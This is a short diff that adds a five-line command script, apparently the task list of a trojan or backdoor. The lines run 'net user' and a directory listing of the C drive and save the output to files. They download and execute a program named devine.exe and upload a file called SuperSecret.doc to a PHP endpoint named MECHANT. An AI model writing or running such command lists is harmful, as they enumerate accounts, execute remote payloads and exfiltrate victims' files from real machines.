@@ -1,0 +1,5 @@
+#EXECMD#cmd /c net user#c:\TROJnetuser.txt
+#EXECMD#cmd /c dir c:\#c:\TROJdirc.txt
+#DOWNLOAD#/box.exe#c:\devine.exe
+#EXECPROG#c:\devine.exe#
+#UPLOAD#/MECHANT/uptest.php#c:\SuperSecret.doc
